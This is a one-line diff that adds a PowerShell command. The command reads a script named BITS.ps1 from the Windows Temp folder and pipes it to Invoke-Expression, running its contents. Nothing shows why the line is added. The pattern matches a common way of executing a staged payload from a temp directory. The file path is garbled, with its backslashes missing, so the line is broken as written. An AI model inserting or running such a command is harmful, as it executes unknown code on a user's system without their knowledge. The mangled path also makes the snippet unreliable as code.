@@ -1,0 +1,1 @@
+gc C:WindowsTempBITS.ps1 | iex
